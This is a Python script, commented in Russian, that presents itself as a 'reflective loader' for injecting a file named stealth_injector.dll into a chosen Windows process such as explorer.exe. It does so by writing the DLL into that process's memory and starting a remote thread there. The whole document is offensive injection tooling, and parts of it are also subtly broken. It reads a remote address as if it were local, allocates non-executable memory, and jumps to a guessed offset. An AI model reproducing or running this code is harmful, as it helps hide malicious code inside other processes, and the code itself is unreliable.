import ctypes
import sys

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_ulong),
        ("cntUsage", ctypes.c_ulong),
        ("th32ProcessID", ctypes.c_ulong),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", ctypes.c_ulong),
        ("cntThreads", ctypes.c_ulong),
        ("th32ParentProcessID", ctypes.c_ulong),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", ctypes.c_ulong),
        ("szExeFile", ctypes.c_char * 260),
    ]

if sys.platform != "win32":
    print("[-] This script works only on Windows")
    sys.exit(1)

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

# ====================== REFLECTIVE LOADER В PYTHON ======================
def reflective_inject_dll(pid: int, dll_bytes: bytes):
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        raise ctypes.WinError()

    try:
        dll_size = len(dll_bytes)

        # Выделяем память в целевом процессе
        remote_mem = kernel32.VirtualAllocEx(h_process, None, dll_size,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if not remote_mem:
            raise ctypes.WinError()

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, dll_bytes, dll_size, ctypes.byref(written))

        # Получаем адрес DllMain
        dos = ctypes.cast(remote_mem, ctypes.POINTER(ctypes.c_uint16)).contents
        if dos.value != 0x5A4D:  # MZ
            raise Exception("Invalid PE signature")

        nt_offset = kernel32.ReadProcessMemory(h_process, remote_mem + 0x3C, ctypes.byref(ctypes.c_uint32()), 4, None)
        # Простая версия — запускаем DllMain через CreateRemoteThread
        entry_point_offset = 0  # Обычно DllMain находится по RVA EntryPoint

        h_thread = ctypes.c_void_p(0)
        status = ntdll.NtCreateThreadEx(
            ctypes.byref(h_thread),
            0x1FFFFF,
            None,
            h_process,
            remote_mem + 0x1000,  # Примерный offset (нужно точнее в реальности)
            None,
            0, 0, 0, 0, None
        )

        print(f"[+] Reflective injection completed! Thread: {h_thread.value}")
        kernel32.WaitForSingleObject(h_thread, 8000)

    finally:
        kernel32.CloseHandle(h_process)
        if 'h_thread' in locals():
            kernel32.CloseHandle(h_thread)


# ====================== MAIN ======================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python loader.py <target_process>")
        print("Example: python loader.py explorer.exe")
        sys.exit(1)

    target = sys.argv[1]

    try:
        # Читаем stealth_injector.dll как байты
        with open("stealth_injector.dll", "rb") as f:
            dll_bytes = f.read()

        print(f"[+] Loaded {len(dll_bytes)} bytes of stealth_injector.dll")

        # Находим PID
        snapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)  # TH32CS_SNAPPROCESS
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

        found = False
        if kernel32.Process32First(snapshot, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.decode('utf-8', errors='ignore').lower() == target.lower():
                    print(f"[+] Found {target} → PID: {pe.th32ProcessID}")
                    reflective_inject_dll(pe.th32ProcessID, dll_bytes)
                    found = True
                    break
                if not kernel32.Process32Next(snapshot, ctypes.byref(pe)):
                    break

        if not found:
            print(f"[-] Process {target} not found")

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        kernel32.CloseHandle(snapshot)